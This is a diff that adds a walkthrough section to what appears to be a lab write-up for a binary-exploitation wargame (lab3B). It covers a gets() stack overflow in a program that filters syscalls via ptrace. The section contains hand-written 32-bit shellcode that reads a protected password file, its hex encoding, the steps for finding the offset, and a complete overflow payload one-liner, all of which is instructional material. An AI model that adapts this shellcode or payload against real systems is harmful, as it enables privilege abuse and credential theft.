@@ -859,3 +859,213 @@ int main()
     return EXIT_SUCCESS;
 }
 ```
+Finding the bug this time is as easy as it could be...User supplied will be read by ```gets()``` without checking length and thus leaving the possibility to trigger stack-based RIP overwrite with customized shellcode. But this time there isn't the possibility to just generate a shellcode that uses execve syscall cause main will stop us doing this.
+Some background infos:
+* Call to ```prctl(PR_SET_PDEATHSIG, SIGHUP);``` ensures that child gets killed if parent dies.
+* Using a call to ```ptrace(PTRACE_TRACEME,...)``` child's execution flow gets controlled by it's parent
+* The syscall that is performed by child gets checked by parent if child exits. It does this by providing variable "PTRACE_PEEKUSER" to ```ptrace()``` which will read in tracee's USER area that is defined in <sys/user.h>:
+
+```C
+struct user_regs_struct {
+	unsigned long	bx;
+	unsigned long	cx;
+	unsigned long	dx;
+	unsigned long	si;
+	unsigned long	di;
+	unsigned long	bp;
+	unsigned long	ax;
+	unsigned long	ds;
+	unsigned long	es;
+	unsigned long	fs;
+	unsigned long	gs;
+	unsigned long	orig_ax;
+	unsigned long	ip;
+	unsigned long	cs;
+	unsigned long	flags;
+	unsigned long	sp;
+	unsigned long	ss;
+};
+```
+* ```orig_eax``` contains syscall num for call that has been made
+
+## Exploit
+
+To exploit this program we have to write custom shell code that opens, reads and writes out contents of /home/lab3A/.pass. Main problem is that while testing exploit in gdb, gdb will fork to new spawned process which will always run as user lab3B. To fix this we'll test our constructed payload with trying to dump contents of /home/lab3B/.pass. There are lot of ways to craft simple shellcode that way. I will introduce a few of them.
+
+At first let's take a look at our 32-bit shellcode so far:
+
+```
+; zero registers
+xor ecx, ecx
+xor eax, eax
+xor edx, edx
+xor ebx, ebx
+
+; open file
+push 0x73736170                 ; push filename little-endian style
+push 0x2e2f4133
+push 0x62616c2f
+push 0x656d6f68
+push 0x2f424242                 ; 0x424242 gets rid of null-bytes
+add esp, 0x3                    ; inc esp to get rid of null bytes
+mov ebx, esp                    ; string pointer to ebx
+mov byte [ebx+0x11], 0x0        ; Terminate filename string
+mov al, 5                       ; syscall integer
+mov dl, 4                       ; read only
+int 0x80                        ; interrupt
+
+; read file
+xor edx, edx                    ; zero edx
+xchg eax, ebx                   ; put file descriptor into ebx
+xchg eax, ecx                   ; put file name in ecx, zero out eax
+mov al, 0x3                     ; sys_call(3) read_file
+mov dl, 0x0c                    ; number of bytes to read
+int 0x80
+
+; print flag
+xor eax, eax                    
+xor ebx, ebx
+mov bl, 1                       ; write to stdin
+mov al, 4                       ; sys_call(4) write
+int 0x80
+
+; sys_close
+xor eax, eax
+xor ebx, ebx
+mov al, 1                       ; sys_call(1) exit 
+int 0x80
+```
+
+Syscall nums used in shellcode can be found like this:
+``` bash
+$ find /usr/include -type f | xargs grep -i -P  "__NR_read"
+```
+
+There's also a handy little tool called [shellnoob](https://github.com/reyammer/shellnoob) for these ones, who don't want to do it that circumstantially:
+
+```
+$ snoob --get-sysnum read
+x86_64 ~> 0
+i386 ~> 3
+```
+Now we are able to translate our human readable assembly information to some machine-code.
+
+```
+$ nasm -f elf32 /tmp/payload -o /tmp/payload.o
+$ file payload.o
+payload.o: ELF 32-bit LSB relocatable, Intel 80386, version 1 (SYSV), not stripped
+$ ld -melf_i386 payload.o -o paylaod_shellcode
+ld: warning: cannot find entry symbol _start; defaulting to 0000000008048060
+nasm -f elf32 /tmp/payload -o /tmp/payload.o
+┌[holger@holger-H270M-DS3H] [/dev/pts/6] 
+└[/tmp]> file payload.o
+payload.o: ELF 32-bit LSB relocatable, Intel 80386, version 1 (SYSV), not stripped
+$ ld -melf_i386 payload.o -o payload_shellcode
+ld: warning: cannot find entry symbol _start; defaulting to 0000000008048060
+$ objdump -D -M intel paylaod_shellcode 
+
+payload_shellcode:     Dateiformat elf32-i386
+
+Disassembly of section .text:
+
+08048060 <__bss_start-0x104c>:
+ 8048060:       31 c9                   xor    ecx,ecx
+ 8048062:       31 c0                   xor    eax,eax
+ 8048064:       31 d2                   xor    edx,edx
+ 8048066:       31 db                   xor    ebx,ebx
+ 8048068:       68 70 61 73 73          push   0x73736170
+ 804806d:       68 33 41 2f 2e          push   0x2e2f4133
+ 8048072:       68 2f 6c 61 62          push   0x62616c2f
+ 8048077:       68 68 6f 6d 65          push   0x656d6f68
+ 804807c:       68 42 42 42 2f          push   0x2f424242
+ 8048081:       83 c4 03                add    esp,0x3
+ 8048084:       89 e3                   mov    ebx,esp
+ 8048086:       c6 43 11 00             mov    BYTE PTR [ebx+0x11],0x0
+ 804808a:       b0 05                   mov    al,0x5
+ 804808c:       b2 04                   mov    dl,0x4
+ 804808e:       cd 80                   int    0x80
+ 8048090:       31 d2                   xor    edx,edx
+ 8048092:       93                      xchg   ebx,eax
+ 8048093:       91                      xchg   ecx,eax
+ 8048094:       b0 03                   mov    al,0x3
+ 8048096:       b2 0c                   mov    dl,0xc
+ 8048098:       cd 80                   int    0x80
+ 804809a:       31 c0                   xor    eax,eax
+ 804809c:       31 db                   xor    ebx,ebx
+ 804809e:       b3 01                   mov    bl,0x1
+ 80480a0:       b0 04                   mov    al,0x4
+ 80480a2:       cd 80                   int    0x80
+ 80480a4:       31 c0                   xor    eax,eax
+ 80480a6:       31 db                   xor    ebx,ebx
+ 80480a8:       b0 01                   mov    al,0x1
+ 80480aa:       cd 80                   int    0x80
+
+$ objdump -D -M intel paylaod_shellcode | awk -F":" '{print $2}' | cut -d" " -f1,2,3,4,5 | tr -d "\t\n " | sed -e 's/\(..\)/\\x\1/g'
+\x31\xc9\x31\xc0\x31\xd2\x31\xdb\x68\x70\x61\x73\x73\x68\x33\x41\x2f\x2e\x68\x2f\x6c\x61\x62\x68\x68\x6f\x6d\x65\x68\x42\x42\x42\x2f\x83\xc4\x03\x89\xe3\xc6\x43\x11\x00\xb0\x05\xb2\x04\xcd\x80\x31\xd2\x93\x91\xb0\x03\xb2\x0c\xcd\x80\x31\xc0\x31\xdb\xb3\x01\xb0\x04\xcd\x80\x31\xc0\x31\xdb\xb0\x01\xcd\x80
+```
+You could also use radare for crafting shellcode for you:
+
+```
+$ r2 -w /tmp/garbage
+[00000000]> waf /tmp/payload @ $$
+Written 76 bytes (f /tmp/payload)=wx 31c931c031d231db68706173736833412f2e682f6c616268686f6d65684242422f83c40389e3c6431100b005b204cd8031d29391b003b20ccd8031c031dbb301b004cd8031c031dbb001cd80
+```
+
+There's also a pythonnic way to do that:
+
+```python
+from pwn import *
+
+context.bits=32
+asm("xor ecx, ecx; xor eax, eax")
+[...]
+```
+
+Also Ruby offers a possibility to craft shellcode with its [metasm](https://github.com/jjyg/metasm) module:
+
+```ruby
+require 'metasm'
+
+ass=File.read("/tmp/payload")
+shellcode=Metasm::Shellcode.assemble(Metasm::Ia32.new, ass).encode_string
+```
+
+The first job now would be to produce a segfault and to determine offset to RIP:
+
+```
+$ strace -i -f "./lab3B" < <(ragg2 -P 256 -r)
+[...]
+[pid  1566] [32414131] --- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x32414131} ---
+[...]
+$ r2 --
+[0x00000000]> woO 0x32414131
+156
+```
+So offset to RIP is at offset 156. We have a 128 bytes buffer, so we know our shellcode can fit (78 bytes). Our payload now will look like this
+
+* 52 bytes nopsled
+* 78 bytes shellcode
+* 28 bytes of padding
+* 4 byte ret address
+
+```
+ python -c 'print "\x90"*52+"\x31\xc9\x31\xc0\x31\xd2\x31\xdb\x68\x70\x61\x73\x73\x68\x33\x41\x2f\x2e\x68\x2f\x6c\x61\x62\x68\x68\x6f\x6d\x65\x68\x42\x42\x42\x2f\x83\xc4\x03\x89\xe3\xc6\x43\x11\x00\xb0\x05\xb2\x04\xcd\x80\x31\xd2\x93\x91\xb0\x03\xb2\x0c\xcd\x80\x31\xc0\x31\xdb\xb3\x01\xb0\x04\xcd\x80\x31\xc0\x31\xdb\xb0\x01\xcd\x80"+"A"*28+"\x10\xf6\xff\xbf"' > /tmp/lab3B
+ ```
+
+Our shellcode may work in gdb, but what will be outside of debugging environment? Again, ```strace``` runs at the user privilege, so we just have to keep lab3B's password file. Our goal here would be to decrement return address until we hit the spot.
+
+A good trick for this is to prepend shellcode with bytes "\xeb\xef" (jmp back one byte). This causes an infinite loop, ```strace``` will hang and we can grab the right return address.
+
+After doing all that, we can observe a beatiful password printed on stdout:
+
+```
+$ ./lab3B < /tmp/lab3B
+just give me some shellcode, k
+wh0_n33ds_5hchild is exiting...
+```
+
+## Pass Lab3A
+
+```
+wh0_n33ds_5hchild is exiting...
+```
